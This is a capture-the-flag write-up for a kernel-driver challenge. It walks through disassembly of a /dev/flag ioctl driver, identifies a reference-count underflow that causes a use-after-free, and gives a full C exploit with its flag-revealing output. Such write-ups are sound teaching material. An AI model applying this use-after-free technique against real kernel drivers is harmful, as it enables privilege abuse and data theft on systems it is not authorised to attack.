# Binary exploit 4

We're given the object file of a kernel device driver responsible for a unique
character device accessed through /dev/flag, along with the appropriate header
file for issuing ioctl requests to that device.

The character device can be opened, read, or written to, as well as controlled
using ioctl requests. Writes to the device are ignored by the driver, and reads
return data from a message buffer, initially containing the message "Welcome to
the flag verification service.", but after a successful exploit, the message
will contain the flag.

It appears that the "intended" use of this device is for it to manage two
copies of the flag, a "kernelflag", which is the secret version, known only to
the kernel, and a "userflag", given by userspace. The ioctls allow for loading
and unloading both the kernelflag and the userflag, and a VERIFYFLAG ioctl
should compare the two.


This challenge gave me a lot of grief. I started out by analyzing a disassembly
of the object file, coming up with a strategy to attack the problem. It appears
that when called with the KERNELFLAGLOAD ioctl, the code _in the object file_
would decrypt an encrypted copy of the flag in the kernel, and store it in
plaintext in memory. My plan was to run the emulator with a breakpoint at some
point in kernelspace after that decryption took place, and then to examine the
emulator memory dump looking for the decrypted flag. When I hit the breakpoint
and the emulator dumped a partial disassembly, it didn't match the disassembly
I was looking at from the object file.

I finally decided to disassemble the whole kernel image instead, and to my
surprise, the code there is subtly different from that in the object file. Back
to square one then ...


## Analyzing the kernel code

In the _real_ copy of the code, the KERNELFLAGLOAD request doesn't do any
decryption at all, but simply (more or less) copies the encrypted kernel flag
from the initialized data segment to a dynamic memory allocation. Similarly,
the USERFLAGLOAD request copies the supplied flag to a dynamically allocated
buffer, and the crypto doesn't happen until the VERIFYFLAG request is called.

There's a catch to accessing the decryption portion of the code, though. The
USERFLAGLOAD request checks that the flag is of a certain length and that it
starts with "FE{" before storing it:

```
8003add4: 40650000  mov     a0, s0              ; Flag given from userspace
8003add8: 477f800c  add     ra, ip,12           ; call strlen(arg)
8003addc: 872328e2  movi    at0, 0x0000651c     ; ...
8003ade0: 8f3fffb0  addi    at0, 0xfffd0000     ; ...
8003ade4: 47fff200  jmp     ip+at0              ; ...
8003ade8: 83c01fe0  movi    t0, 0x000000ff
8003adec: 606f0080  and     a0, t0 shl (zz + 0)
8003adf0: b8658147  cjmpne  a0,s1,0x8003ae18    ; branch to "unable to load flag" if (strlen & 0xff) != 50

8003adf4: 8091c820  movi    a1, 0x00008e41      ; STRING: "FE{"
8003adf8: 88880071  addi    a1, 0x80060000      ; ...
8003adfc: 40a00003  add     a2, zz,3
8003ae00: 40650000  mov     a0, s0
8003ae04: 477f800c  add     ra, ip,12           ; call strncmp(arg, "FE{", 3)
8003ae08: 87234fe2  movi    at0, 0x000069fc     ; ...
8003ae0c: 8f3fffb0  addi    at0, 0xfffd0000     ; ...
8003ae10: 47fff200  jmp     ip+at0              ; ...
8003ae14: b86014e3  cjmpeq  a0,zz,0x8003b0b0    ; branch if strncmp == 0 (i.e. string starts with "FE{")
                                                ; else

8003ae18: 8067c0e2  movi    a0, 0x0000f81c      ; STRING: "%sUnable to load your flag."
8003ae1c: 88680071  addi    a0, 0x80060000      ; ...
8003ae20: 809fe660  movi    a1, 0x0000ff33      ; STRING: "\e[34;1m=\e[32;1m*\e[34;1m= \e[m"
8003ae24: 88880071  addi    a1, 0x80060000      ; ...
8003ae28: 477f800c  add     ra, ip,12
8003ae2c: 872205e2  movi    at0, 0x000040bc
8003ae30: 8f3fffb0  addi    at0, 0xfffd0000
8003ae34: 47fff200  jmp     ip+at0              ; call printk
8003ae38: 406000ea  add     a0, zz,-22
8003ae3c: b8000ec3  jmp     0x8003b014          ; jmp to exit
```

The VERIFYFLAG request compares the stored userflag against the stored (and
encrypted) kernelflag before continuing, so because the userflag must start
with "FE{" and the encrypted kernelflag does not, at first glance, it appears
to be impossible to bypass that check and get anywhere near getting the crypto
code executed:

```
8003ae88: 83c27163  movi    t0, 0x00009c58      ; userflagRefCnt
8003ae8c: 8bd000f0  addi    t0, 0x80070000      ; ...
8003ae90: 03ef0000  ldb     t1, [t0+0]
8003ae94: 43c00001  add     t0, zz,1
8003ae98: bbef0a67  cjmpne  t1,t0,0x8003afe4    ; branch if refcnt != 1 to "Verification fail, no flag loaded." error

8003ae9c: 83e09c65  movi    t1, 0x00009c60      ; kernelflagRefCnt
8003aea0: 8bf000f0  addi    t1, 0x80070000      ; ...
8003aea4: 03ef8000  ldb     t1, [t1+0]
8003aea8: bbef0a47  cjmpne  t1,t0,0x8003aff0    ; branch if refcnt != 1 to "Verification fail, no solution flag loaded." error

8003aeac: 83c4e322  movi    t0, 0x00009c64      ; kernelflag
8003aeb0: 8bd000f0  addi    t0, 0x80070000      ; ...
8003aeb4: 108f0000  ldw     a1, [t0+0]
8003aeb8: 83c4e2e2  movi    t0, 0x00009c5c      ; userflag
8003aebc: 8bd000f0  addi    t0, 0x80070000      ; ...
8003aec0: 106f0000  ldw     a0, [t0+0]
8003aec4: 40a00032  add     a2, zz,50
8003aec8: 477f800c  add     ra, ip,12           ; call strncmp(userflag, kernelflag, 50)
8003aecc: 8721a4e3  movi    at0, 0x00006938     ; ...
8003aed0: 8f3fffb0  addi    at0, 0xfffd0000     ; ...
8003aed4: 47fff200  jmp     ip+at0              ; ...

8003aed8: b8601023  cjmpeq  a0,zz,0x8003b0dc    ; jmp to success ("You rock!" message) if strncmp == 0
8003aedc: 806114a1  movi    a0, 0x0000114a      ; STRING: "%sVerification failed. Flags do not match."
8003aee0: 887000f0  addi    a0, 0x80070000      ; ...
8003aee4: b80008a3  jmp     0x8003aff8          ; jump to error output and exit
```


## The use-after-free error

In addition to the dynamically allocated strings, the kernel module also
maintains a reference count to both flags in an unsigned char (8-bit) variable.
When issuing the XXXFLAGLOAD ioctl request, the appropriate refcount is
checked, and the request fails if the refcount is already 1, otherwise memory
is allocated, the flag is copied, and the refcount is incremented. The
XXXFLAGFREE requests, however, contain a flaw in the reference counting,
essentially coded like this:

```
if (flagRefCount == 1) {
	kfree(flag);
}
flagRefCount--;
``

When calling the XXXFLAGFREE ioctl request, the reference count is always
decremented. If it was 1, the memory is freed, but the pointer is not cleared.
If the reference count was 0, it's decremented and wraps around to 255. We can
keep decrementing it until it reaches 1 again, indicating that a valid flag is
loaded, but the memory that the flag variable points to is no longer valid. We
can use this to make the two flags equal: First we load the kernelflag, then
free it a bunch of times until the refcount is 1 again, then load a dummy
userflag. The memory allocation that is made to store a copy of the userflag
will be for the exact same size as the block just freed by the kernelflag, so
now userflag and kernelflag point to the same string in memory. The verifyflag
request will succeed, and we get the flag.

C code to exploit the bug:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "devflag.h"

/* The flag argument MUST be 50 characters long, and MUST start with "FE{".
 * Other than that, it can be anything. */

const char dummy_userflag[] = "FE{1234567890123456789012345678901234567890123456}";

int main(int argc, char **argv)
{
        int fd = open("/dev/flag", O_RDWR);

        ioctl(fd, KERNELFLAGLOAD, NULL); /* refcnt = 1 */
        ioctl(fd, KERNELFLAGFREE, NULL); /* refcnt = 0 */
        ioctl(fd, KERNELFLAGFREE, NULL); /* refcnt = 0xFF */

        for (int refcnt = 0xFF; refcnt != 1; --refcnt) {
                ioctl(fd, KERNELFLAGFREE, NULL); /* refcnt = 0xFE .. 1 */
        }

        /* Now the kernelflag's refcount is back to 1 again, but the kernelflag
         * variable points to a free'd area of memory. When we load the dummy
         * userflag again, the kernel module will allocate a new 50-byte chunk
         * of memory for its copy o the userflag, but it will be given the same
         * chunk as the kernelflag previously held and still points to.
         *
         * After the dummy userflag is loaded, both the userflag and kernelflag
         * point to the same address in memory, so they will compare as equal,
         * and the VERIFYFLAG ioctl will allow us to continue and collect the
         * flag.
         */

        ioctl(fd, USERFLAGLOAD, dummy_userflag);
        ioctl(fd, VERIFYFLAG, NULL);

        char buffer[51];
        read(fd, buffer, sizeof(buffer));
        printf("%s\n", buffer);
}
```

Running it shows we hit the expected "You rock!", and the character device now
allows the decrypted flag to be read out.

```
hacker@sphinx # ./exploit-refcount
=*= Flag loaded for verification
=*= You rock!
FE{S3crets_0f_th3_sph1nx_4nd_the_tri4ls_of_fenix!}
```


---
_Peter Tirsek, 2020-01-21_
